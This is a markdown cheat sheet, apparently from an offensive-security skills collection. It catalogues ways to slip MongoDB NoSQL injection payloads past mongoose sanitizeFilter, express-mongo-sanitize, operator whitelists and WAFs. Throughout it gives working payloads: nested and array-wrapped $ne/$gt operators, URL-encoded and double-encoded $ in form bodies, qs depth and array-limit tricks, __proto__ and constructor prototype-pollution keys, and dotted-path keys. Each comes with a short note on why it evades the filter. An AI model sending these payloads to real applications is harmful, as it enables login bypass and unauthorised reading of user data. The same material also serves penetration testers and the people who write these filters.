# Filter bypass — the sanitize/whitelist evasions

## The `sanitizeFilter` — mongoose's `$`-strip

```javascript
mongoose.sanitizeFilter(req.body)   — strips $-keys
```

`sanitizeFilter` removes any key starting with `$` — the `$ne`/`$gt`/`$regex`
are stripped — the object becomes a scalar-filter — the bypass is a
non-`$` operator or a non-`$` carrier — `detection.md`.

## The non-`$` operators — the `_`-aliases

```json
{"user": {"_ne": null}}     — no — `_ne` is not an operator
```

No `_`-aliases exist — the `$` is required — the sanitize-filter
defeats the standard operators.

## The nested-depth — `$gt` inside a deeper key

```json
{"user": {"profile": {"$gt": ""}}}
{"filter": {"user": {"$gt": ""}}}
{"q": {"user": {"$ne": null}}}
{"data": {"credentials": {"user": {"$ne": null}}}}
```

The `$`-key inside a nested field — `sanitizeFilter` strips top-level
`$`-keys — a nested `$`-key may survive — depends on the sanitize's
depth — `detection.md`.

## The array-carrier — `[{"$ne": null}]`

```json
{"user": [{"$ne": null}]}
{"user": [{"$gt": ""}]}
```

An ARRAY of objects — `sanitizeFilter` may not recurse into arrays —
`detection.md`.

## The unicode-`$` — the homoglyph

```json
{"user": {"\u0024ne": null}}
{"user": {"$ne": null}}
```

`\u0024` is `$` — a parser that decodes the escape after sanitize —
a unicode-bypass — usually doesn't work (the JSON parser decodes before
sanitize) — `common-mistakes.md`.

## The `%24` form-encoding — `user%5B%24ne%5D=x`

```text
user%5B%24ne%5D=x&pass%5B%24ne%5D=x
```

`%24` = `$` — the qs-parser decodes `%24` → `$` after the WAF —
the WAF sees `%24ne`, the parser sees `$ne` — the form-carrier bypass —
`injection-points.md`.

## The double-encoded — `%2524`

```text
user%5B%2524ne%5D=x
```

`%2524` decodes twice → `%24` → `$` — a double-decode bypass.

## The `qs` depth-limit — `qs.parse(a[b][c][d][e])`

`qs` has a `depth` limit (default 5) — a deeper nest is dropped or
flattened — the depth-limit's interplay — `injection-points.md`.

## The `qs` array-limit — `qs.parse(a[]=x)` index-limit

`qs` has `arrayLimit` (default 20) — `a[20]` becomes an object-key not
an array-index — the index-vs-object confusion.

## The `qs` `allowPrototypes` — `a[__proto__][x]=y`

```text
a[__proto__][x]=y     — the proto-key — qs blocks it by default
a[constructor][prototype][x]=y  — the constructor-path
```

The `__proto__`/`constructor`/`prototype` keys — `qs` blocks them —
`skills/web-prototype-pollution/` — the pollution class.

## The custom-whitelist — the allowed-operators-only

```javascript
const allowed = ['$eq', '$in'];
const filter = pick(req.body, allowed);
```

A whitelist — only named operators pass — the bypass is an operator
the whitelist missed — `operators.md` — the full list.

## The `express-mongo-sanitize` — the middleware

```javascript
app.use(mongoSanitize());   — strips $ and . from keys
```

`express-mongo-sanitize` — strips `$`-keys AND `.`-keys — the `.`-strip
also breaks `a.b` dotted-paths — the `.`-key carriers.

## The `.`-key — `{"a.b": {"$ne": null}}` — the dotted-path

```json
{"a.b": {"$ne": null}}
```

A `.`-key — Mongo reads `a.b` as a dotted-path — `a`'s `b` field —
the dotted-path injection — `mongo-specific.md`.
